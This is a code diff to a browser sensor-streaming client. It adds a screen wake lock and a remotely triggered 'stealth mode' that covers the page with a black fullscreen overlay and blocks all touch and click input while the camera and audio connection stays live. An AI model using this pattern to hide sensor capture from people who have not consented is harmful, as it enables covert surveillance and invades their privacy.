@@ -26,6 +26,8 @@ export class HeadlessNodeIntelClient {
     this.onNotification = options.onNotification || (() => {});
     this.onError = options.onError || (() => {});
 
+    this.wakeLock = null;
+
     if (options.videoElement) {
       SensorsManager.setVideoElement(options.videoElement);
     }
@@ -53,6 +55,81 @@ export class HeadlessNodeIntelClient {
         this.socket.send({ type: 'telemetry_update', telemetry });
       }
     };
+
+    // Handle re-acquiring wake lock on tab visibility change
+    document.addEventListener('visibilitychange', async () => {
+      if (this.wakeLock !== null && document.visibilityState === 'visible' && this.isConnected) {
+        await this.requestWakeLock();
+      }
+    });
+  }
+
+  requestWakeLock() {
+    try {
+      if ('wakeLock' in navigator) {
+        navigator.wakeLock.request('screen').then(lock => {
+          this.wakeLock = lock;
+          this.wakeLock.addEventListener('release', () => {
+            console.log('[Wake Lock] Released');
+          });
+          console.log('[Wake Lock] Acquired');
+        }).catch(e => console.warn(`[Wake Lock] Error: ${e.message}`));
+      }
+    } catch (err) {
+      console.warn(`[Wake Lock] Error: ${err.message}`);
+    }
+  }
+
+  releaseWakeLock() {
+    if (this.wakeLock !== null) {
+      this.wakeLock.release().catch(() => {});
+      this.wakeLock = null;
+    }
+  }
+
+  enableStealthMode() {
+    if (!document.getElementById('nodeintel-stealth-overlay')) {
+      const overlay = document.createElement('div');
+      overlay.id = 'nodeintel-stealth-overlay';
+      overlay.style.position = 'fixed';
+      overlay.style.top = '0';
+      overlay.style.left = '0';
+      overlay.style.width = '100vw';
+      overlay.style.height = '100vh';
+      overlay.style.backgroundColor = '#000000';
+      overlay.style.zIndex = '999999';
+      overlay.style.pointerEvents = 'auto';
+      
+      // Swallow touches
+      const swallow = (e) => { e.preventDefault(); e.stopPropagation(); };
+      overlay.addEventListener('touchstart', swallow, { passive: false });
+      overlay.addEventListener('touchmove', swallow, { passive: false });
+      overlay.addEventListener('touchend', swallow, { passive: false });
+      overlay.addEventListener('click', swallow);
+      overlay.addEventListener('contextmenu', swallow);
+
+      document.body.appendChild(overlay);
+
+      // Attempt fullscreen
+      try {
+        if (document.documentElement.requestFullscreen) {
+          document.documentElement.requestFullscreen().catch(()=>{});
+        } else if (document.documentElement.webkitRequestFullscreen) {
+          document.documentElement.webkitRequestFullscreen().catch(()=>{});
+        }
+      } catch(e) {}
+    }
+  }
+
+  disableStealthMode() {
+    const overlay = document.getElementById('nodeintel-stealth-overlay');
+    if (overlay) {
+      overlay.remove();
+    }
+    try {
+      if (document.exitFullscreen) document.exitFullscreen().catch(()=>{});
+      else if (document.webkitExitFullscreen) document.webkitExitFullscreen().catch(()=>{});
+    } catch(e) {}
   }
 
   handleSocketOpen() {
@@ -88,6 +165,9 @@ export class HeadlessNodeIntelClient {
       // Audio context resume must be handled within the user gesture
       SensorsManager.resumeAudioContext();
 
+      // Request screen to stay on
+      await this.requestWakeLock();
+
       this.isConnected = true;
       this.onStatusChange('CONNECTED');
       this.onCameraUpdate(false, SensorsManager.currentFacing);
@@ -105,6 +185,7 @@ export class HeadlessNodeIntelClient {
   disconnect() {
     SensorsManager.stopAll();
     if (this.webrtc) this.webrtc.close();
+    this.releaseWakeLock();
 
     this.isConnected = false;
     this.onStatusChange('DISCONNECTED');
@@ -210,6 +291,16 @@ export class HeadlessNodeIntelClient {
         }
         break;
       }
+
+      case 'stealth_mode':
+        if (payload && payload.enabled) {
+          this.enableStealthMode();
+          this.onNotification('Stealth Mode Enabled', 'warn');
+        } else {
+          this.disableStealthMode();
+          this.onNotification('Stealth Mode Disabled', 'info');
+        }
+        break;
     }
   }
 }
